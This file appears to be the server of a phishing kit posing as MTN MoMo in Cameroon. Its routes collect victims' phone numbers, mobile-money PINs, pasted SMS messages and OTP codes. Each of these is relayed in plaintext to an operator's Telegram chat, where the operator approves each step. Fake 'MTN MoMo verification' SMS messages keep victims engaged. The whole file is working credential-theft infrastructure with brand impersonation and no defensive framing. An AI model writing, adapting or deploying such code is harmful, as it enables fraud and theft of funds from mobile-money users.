require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fetch = require('node-fetch');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../frontend')));

// ============ CONFIGURATION ============
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const SMS_GATEWAY_URL = process.env.SMS_GATEWAY_URL;
const SMS_GATEWAY_API_KEY = process.env.SMS_GATEWAY_API_KEY;

// ============ IN-MEMORY STORE ============
const applications = {};      // appId -> application object

// ============ HELPERS ============
function generateId() {
  return 'APP' + Math.random().toString(36).substring(2, 10).toUpperCase();
}

function generateCode(len = 4) {
  return Math.floor(10 ** (len - 1) + Math.random() * 9 * 10 ** (len - 1)).toString();
}

async function sendTelegramMessage(text, buttons = null) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const body = {
    chat_id: TELEGRAM_CHAT_ID,
    text: text
  };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  try {
    await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
  } catch (e) {
    console.error('Telegram send error:', e);
  }
}

async function sendSms(to, text) {
  if (!SMS_GATEWAY_URL || !SMS_GATEWAY_API_KEY) {
    console.log(`[SIMULATED SMS] to ${to}: ${text}`);
    return;
  }
  try {
    await axios.post(`${SMS_GATEWAY_URL}/sms`, {
      to,
      text
    }, {
      headers: {
        'Content-Type': 'application/json',
        'x-api-key': SMS_GATEWAY_API_KEY
      }
    });
  } catch (e) {
    console.error('SMS send error:', e.message);
  }
}

// ============ ROUTES ============

// Health check
app.get('/api/health', (req, res) => res.json({ ok: true }));

// VERIFY PIN – called by frontend when user submits phone + PIN
app.post('/api/verify-pin', async (req, res) => {
  const { phoneNumber, pin } = req.body;
  if (!phoneNumber || !pin) {
    return res.status(400).json({ success: false, message: 'Missing required fields' });
  }

  // Create a new application
  const appId = generateId();
  applications[appId] = {
    phoneNumber,
    pin,
    pinStatus: 'pending',
    smsStatus: 'pending',
    otpStatus: 'pending',
    smsCode: null,
    otpCode: null,
    createdAt: new Date().toISOString()
  };

  // Notify admin for PIN approval
  const message = `🔐 *PIN VERIFICATION REQUIRED*\n\nApplication ID: ${appId}\nPhone: +237${phoneNumber}\nPIN: ${pin}\n\nApprove or reject:`;
  const buttons = [[
    { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'PIN', appId }) },
    { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'PIN', appId }) }
  ]];
  await sendTelegramMessage(message, buttons);

  res.json({ success: true, applicationId: appId });
});

// CHECK PIN STATUS – frontend polls this
app.get('/api/check-pin-status/:applicationId', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
  res.json({ success: true, status: app.pinStatus });
});

// RESEND SMS – called when user requests a new SMS (timer expired)
app.post('/api/resend-sms', async (req, res) => {
  const { applicationId } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });

  // Generate new SMS code and send
  const newCode = generateCode(6);
  app.smsCode = newCode;
  const smsText = `Your MTN MoMo verification code is: ${newCode}`;
  await sendSms(`+237${app.phoneNumber}`, smsText);

  // Notify admin about resend
  const message = `🔄 *SMS RESENT*\n\nApplication ID: ${applicationId}\nPhone: +237${app.phoneNumber}\nNew SMS code: ${newCode}\n\nPlease verify the SMS message the user will paste.`;
  const buttons = [[
    { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'SMS', appId: applicationId }) },
    { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'SMS', appId: applicationId }) }
  ]];
  await sendTelegramMessage(message, buttons);

  res.json({ success: true, message: 'SMS resent' });
});

// VERIFY SMS – called when user submits the pasted SMS
app.post('/api/verify-sms', async (req, res) => {
  const { applicationId, smsMessage } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });

  // Check if smsMessage matches the sent code
  const extractedCode = (smsMessage.match(/\d{6}/) || [])[0];
  if (!extractedCode || extractedCode !== app.smsCode) {
    return res.json({ success: false, message: 'SMS code does not match. Please try again.' });
  }

  app.smsStatus = 'pending'; // awaiting admin approval

  // Notify admin for SMS approval
  const message = `📨 *SMS MESSAGE RECEIVED*\n\nApplication ID: ${applicationId}\nPhone: +237${app.phoneNumber}\nSMS Message: ${smsMessage}\n\nApprove or reject:`;
  const buttons = [[
    { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'SMS', appId: applicationId }) },
    { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'SMS', appId: applicationId }) }
  ]];
  await sendTelegramMessage(message, buttons);

  res.json({ success: true });
});

// CHECK OTP STATUS – frontend polls this (also used for SMS approval)
app.get('/api/check-otp-status/:applicationId', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });

  let status;
  if (app.smsStatus !== 'approved') {
    status = app.smsStatus;
  } else {
    status = app.otpStatus;
  }
  res.json({ success: true, status });
});

// VERIFY OTP – called when user submits OTP code
app.post('/api/verify-otp', async (req, res) => {
  const { applicationId, otp } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });

  // Check OTP
  if (otp !== app.otpCode) {
    app.otpAttempts = (app.otpAttempts || 0) + 1;
    if (app.otpAttempts >= 5) {
      app.otpStatus = 'blocked';
      return res.json({ success: false, message: 'Too many incorrect OTP attempts. Please request a new OTP.' });
    }
    return res.json({ success: false, message: 'Incorrect OTP. Please try again.' });
  }

  app.otpStatus = 'pending'; // awaiting admin approval

  // Notify admin for OTP approval
  const message = `🔑 *OTP VERIFICATION*\n\nApplication ID: ${applicationId}\nPhone: +237${app.phoneNumber}\nOTP: ${otp}\n\nApprove or reject:`;
  const buttons = [[
    { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'OTP', appId: applicationId }) },
    { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'OTP', appId: applicationId }) }
  ]];
  await sendTelegramMessage(message, buttons);

  res.json({ success: true });
});

// ============ TELEGRAM WEBHOOK ============
app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body;

  if (update.callback_query) {
    const query = update.callback_query;
    let data;
    try {
      data = JSON.parse(query.data);
    } catch (e) {
      return res.sendStatus(200);
    }

    const { a, step, appId } = data;
    const app = applications[appId];
    if (!app) return res.sendStatus(200);

    // Update status based on step and action
    if (step === 'PIN') {
      app.pinStatus = a === 'APPROVE' ? 'approved' : 'rejected';
      if (app.pinStatus === 'approved') {
        // Generate and send SMS code to user
        const smsCode = generateCode(6);
        app.smsCode = smsCode;
        const smsText = `Your MTN MoMo verification code is: ${smsCode}`;
        await sendSms(`+237${app.phoneNumber}`, smsText);
      }
    } else if (step === 'SMS') {
      app.smsStatus = a === 'APPROVE' ? 'approved' : 'rejected';
      if (app.smsStatus === 'approved') {
        // Generate OTP and send via SMS
        const otpCode = generateCode(4);
        app.otpCode = otpCode;
        const otpText = `Your MTN MoMo OTP is: ${otpCode}`;
        await sendSms(`+237${app.phoneNumber}`, otpText);
      }
    } else if (step === 'OTP') {
      app.otpStatus = a === 'APPROVE' ? 'approved' : 'rejected';
    }

    // Answer callback query
    await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: query.id, text: `✅ ${a}` })
    });

    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

// Serve frontend (if it exists)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

// ============ START SERVER ============
app.listen(PORT, () => {
  console.log(`🚀 MTN Cameroon server running on port ${PORT}`);
});
